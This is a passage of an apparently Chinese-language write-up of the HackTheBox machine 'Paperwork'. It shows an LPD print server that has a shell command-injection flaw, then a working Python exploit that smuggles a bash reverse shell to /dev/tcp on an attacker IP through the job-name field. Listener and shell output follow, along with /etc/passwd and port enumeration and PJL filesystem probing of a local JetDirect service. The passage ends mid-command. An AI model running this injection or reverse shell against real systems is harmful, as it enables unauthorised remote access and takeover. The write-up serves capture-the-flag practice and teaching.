+</span></span><span class="line"><span class="cl">        <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">handle_print_job</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># queue是data第一字节后的所有数据</span>
+</span></span><span class="line"><span class="cl">        <span class="n">queue</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">queue</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">VALID_QUEUE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">id</span><span class="si">}</span><span class="s2"> Rejected: Invalid queue &#39;</span><span class="si">{</span><span class="n">queue</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">id</span><span class="si">}</span><span class="s2"> Accepted job for queue: </span><span class="si">{</span><span class="n">queue</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">chunk</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span> <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="n">subcommand</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 服务端回复0x00 即确认ACK</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">parts</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">parts</span><span class="p">:</span> <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="c1"># parts[0]是文件大小字符串</span>
+</span></span><span class="line"><span class="cl">                <span class="n">size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">                <span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">content</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="n">decoded_content</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="c1"># 只要找到一行以大写J开头 就把J后面的内容赋值给job_name</span>
+</span></span><span class="line"><span class="cl">                <span class="n">job_name</span> <span class="o">=</span> <span class="s2">&#34;Unknown&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">decoded_content</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;J&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">job_name</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">id</span><span class="si">}</span><span class="s2"> Executing archive for: </span><span class="si">{</span><span class="n">job_name</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 字符串直接拼接执行命令</span>
+</span></span><span class="line"><span class="cl">                <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;echo &#39;Archive: </span><span class="si">{</span><span class="n">job_name</span><span class="si">}</span><span class="s2">&#39; &gt;&gt; /tmp/archive.log&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 连续两个 \x00 ACK 通知客户端文件接受完成</span>
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">LpdServer</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="c1"># 构造函数</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1515</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 创建套接字 AF_INET=IPv4 SOCK_STREAM=TCP</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># SO_REUSEADDR 允许端口快速复用</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># socket绑定ip和端口</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 挂起连接队列的最大长度</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] LPD Server listening on </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 循环接受连接</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># accept()阻塞调用 程序卡在这里等待客户端连接</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sock</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 启动子线程</span>
+</span></span><span class="line"><span class="cl">            <span class="n">LpdHandler</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LpdServer</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">1515</span><span class="p">)</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一个简易的 <code>LPD/LPR</code> 打印协议服务端，开放在 1515 端口。</p>
+<p>根据服务器端的逻辑进行命令注入。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&#34;10.129.248.117&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span>   <span class="o">=</span> <span class="mi">1515</span>
+</span></span><span class="line"><span class="cl"><span class="n">LHOST</span>  <span class="o">=</span> <span class="s2">&#34;10.10.17.69&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LPORT</span>  <span class="o">=</span> <span class="mi">1234</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Payload: break out of the echo command and inject a reverse shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">LHOST</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">LPORT</span><span class="si">}</span><span class="s2"> 0&gt;&amp;1&#39;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">job_name</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;test&#39;; </span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2"> ; echo &#39;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">control_content</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;J</span><span class="si">{</span><span class="n">job_name</span><span class="si">}</span><span class="se">\n</span><span class="s2">Hattacker</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">control_bytes</span> <span class="o">=</span> <span class="n">control_content</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">control_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 1: Send &#34;Receive job&#34; command with empty queue</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x02\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 2: Send &#34;Receive control file&#34; subcommand</span>
+</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="se">\x02</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2"> cfA001</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">header</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ACK header:&#34;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 3: Send the malicious control file</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">control_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 4: Receive final acknowledgements</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ACK final:&#34;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开启端口监听，然后执行代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Paperwork<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>                               
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Paperwork<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 exp.py                                                           
+</span></span><span class="line"><span class="cl">ACK header: b<span class="s1">&#39;\x00&#39;</span>
+</span></span><span class="line"><span class="cl">ACK final: b<span class="s1">&#39;\x00&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 Shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Paperwork<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>                               
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.17.69<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.77.153<span class="o">]</span> <span class="m">34914</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>987<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">lp@paperwork:/opt/LPDServer$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>7<span class="o">(</span>lp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>7<span class="o">(</span>lp<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>7<span class="o">(</span>lp<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>稳定 Shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34;</span>
+</span></span><span class="line"><span class="cl">Ctrl + Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="横向移动">横向移动
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lp@paperwork:/opt$ cat /etc/passwd <span class="p">|</span> grep /bin/bash
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>除 <code>root</code> 外还存在一个 <code>archivist</code> 用户。</p>
+<p>查看本机正在监听的 TCP、UDP 端口。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lp@paperwork:/opt$ netstat -tuln
+</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:9100          0.0.0.0:*               LISTEN     
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.54:53           0.0.0.0:*               LISTEN     
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN     
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN     
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:1515            0.0.0.0:*               LISTEN     
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:1337          0.0.0.0:*               LISTEN     
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN     
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN     
+</span></span><span class="line"><span class="cl">udp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.54:53           0.0.0.0:*                          
+</span></span><span class="line"><span class="cl">udp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*                          
+</span></span><span class="line"><span class="cl">udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:68              0.0.0.0:*                          
+</span></span><span class="line"><span class="cl">udp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:323           0.0.0.0:*                          
+</span></span><span class="line"><span class="cl">udp6       <span class="m">0</span>      <span class="m">0</span> ::1:323                 :::* 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可见还开放了 <code>9100</code> 端口，<code>HP JetDirect</code> — 一种使用 <code>PJL</code>（打印作业语言）的打印机协议。</p>
+<p><code>PJL</code> 内置文件系统命令：<code>FSDIRLIST</code>（列出目录）、<code>FSUPLOAD</code>（读取文件）、<code>FSDOWNLOAD</code>（写入文件）。专为管理打印机固件而设计，但如果“文件系统”映射到真正的文件系统，它们就变成了读/写原语。</p>
+<p>收集 <code>JetDirect</code> 信息并阅读其源代码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lp@paperwork:/opt$ python3 -c <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; import socket
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s = socket.socket()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.connect((&#39;127.0.0.1&#39;, 9100))
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.send(b&#39;@PJL INFO ID\r\n&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; res = s.recv(4096)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; print(res)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.close()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; &#34;</span>
+</span></span><span class="line"><span class="cl">b<span class="s1">&#39;HP LASERJET 4ML\r\n&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lp@paperwork:/opt$ python3 -c <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; import socket
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s = socket.socket()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.connect((&#39;127.0.0.1&#39;, 9100))
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.send(b&#39;@PJL INFO FILESYS\r\n&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; res = s.recv(4096)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; print(res)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.close()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; &#34;</span>
+</span></span><span class="line"><span class="cl">b<span class="s1">&#39;VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS\n0:     1755136    1718272    &lt;HT&gt;     &lt;HT&gt;  READ-WRITE\r\n&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lp@paperwork:/opt$ python3 -c <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; import socket
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s = socket.socket()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.connect((&#39;127.0.0.1&#39;, 9100))
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.send(b&#39;@PJL FSDIRLIST NAME=&#34;</span>0:<span class="s2">&#34;\r\n&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; res = s.recv(4096)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; print(res)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; s.close()
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt; &#34;</span>
